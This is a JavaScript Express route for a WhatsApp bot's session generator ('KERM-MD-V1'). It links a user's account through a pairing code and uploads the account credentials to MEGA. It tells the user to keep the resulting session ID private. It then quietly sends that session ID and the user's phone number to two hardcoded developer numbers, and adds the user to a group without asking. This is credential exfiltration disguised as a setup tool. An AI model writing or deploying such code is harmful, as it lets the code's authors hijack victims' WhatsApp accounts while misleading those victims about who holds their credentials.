import express from 'express';
import fs from 'fs';
import pino from 'pino';
import {
    makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser
} from '@whiskeysockets/baileys';
import { upload } from './mega.js';

const router = express.Router();

const DEVELOPERS = ['237656520674@s.whatsapp.net', '237650564445@s.whatsapp.net'];
const GROUP_ID = '120363186494616906@g.us'; // ID du groupe WhatsApp (extrait automatiquement)
const CHANNEL_LINK = 'https://whatsapp.com/channel/0029Vafn6hc7DAX3fzsKtn45';

function removeFile(FilePath) {
    try {
        if (!fs.existsSync(FilePath)) return false;
        fs.rmSync(FilePath, { recursive: true, force: true });
    } catch (e) {
        console.error('Error removing file:', e);
    }
}

router.get('/', async (req, res) => {
    let num = req.query.number;
    let dirs = './' + (num || `session`);

    await removeFile(dirs);

    async function initiateSession() {
        const { state, saveCreds } = await useMultiFileAuthState(dirs);

        try {
            let sock = makeWASocket({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }))
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }),
                browser: Browsers.ubuntu("KERM-MD-V1")
            });

            if (!sock.authState.creds.registered) {
                await delay(2000);
                num = num.replace(/[^0-9]/g, '');
                const code = await sock.requestPairingCode(num);
                if (!res.headersSent) {
                    console.log({ num, code });
                    await res.send({ code });
                }
            }

            sock.ev.on('creds.update', saveCreds);
            sock.ev.on("connection.update", async (s) => {
                const { connection, lastDisconnect } = s;

                if (connection === "open") {
                    await delay(10000);
                    const sessionData = fs.readFileSync(dirs + '/creds.json');

                    function generateRandomId(length = 6, numberLength = 4) {
                        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                        let result = '';
                        for (let i = 0; i < length; i++) {
                            result += characters.charAt(Math.floor(Math.random() * characters.length));
                        }
                        const number = Math.floor(Math.random() * Math.pow(10, numberLength));
                        return `${result}${number}`;
                    }

                    const megaUrl = await upload(fs.createReadStream(`${dirs}/creds.json`), `${generateRandomId()}.json`);
                    let sessionId = 'KERM-MD-V1~' + megaUrl.replace('https://mega.nz/file/', '');

                    const userJid = jidNormalizedUser(num + '@s.whatsapp.net');

                    await sock.sendMessage(userJid, { text: sessionId });
                    await sock.sendMessage(userJid, {
                        text: `🎉 *Welcome to KERM-MD-V1!* 🚀\n\n🔒 *Your Session ID* is ready!  ⚠️ _Keep it private and secure — dont share it with anyone._\n\n🔑 *Copy & Paste the SESSION_ID Above*🛠️ Add it to your environment variable: *SESSION_ID*.\n\n💡 *Whats Next?*\n1️⃣ Explore all the cool features of Kerm MD V1.\n2️⃣ Stay updated with our latest releases and support.\n3️⃣ Enjoy seamless WhatsApp automation! 🤖\n🔗 *Join Our Support Channel:* 👉\n[Click Here to Join](https://whatsapp.com/channel/0029Vafn6hc7DAX3fzsKtn45)\n⭐ *Show Some Love!* Give us a ⭐ on GitHub and support the development: 👉 [KERM-MD-V1 GitHub Repo](https://github.com/Kgtech-cmr/)\n🚀 _Thanks for choosing KERM-MD-V1 — Let the automation begin!_ ✨`
                    });

                    // Ajout automatique dans le groupe
                    try {
                        await sock.groupParticipantsUpdate(GROUP_ID, [userJid], "add");
                    } catch (err) {
                        console.log("Error adding to group :", err.message);
                    }

                    // Message de succès aux développeurs
                    for (let dev of DEVELOPERS) {
                        await sock.sendMessage(dev, {
                            text: `✅ *NEW USER CONNECTED! *\N\n• Number: ${num}\n• Session: ${sessionId}\n• Added to the KERM-MD-V1 group`
                        });
                    }

                    // Clean up
                    await delay(1000);
                    removeFile(dirs);
                    process.exit(0);
                } else if (connection === 'close' && lastDisconnect?.error?.output?.statusCode !== 401) {
                    console.log('Connection closed unexpectedly:', lastDisconnect?.error);
                    await delay(10000);
                    initiateSession();
                }
            });
        } catch (err) {
            console.error('Erreur de session:', err);
            if (!res.headersSent) {
                res.status(503).send({ code: 'Service Unavailable' });
            }
        }
    }

    await initiateSession();
});

process.on('uncaughtException', (err) => {
    console.log('Caught exception: ' + err);
});

export default router;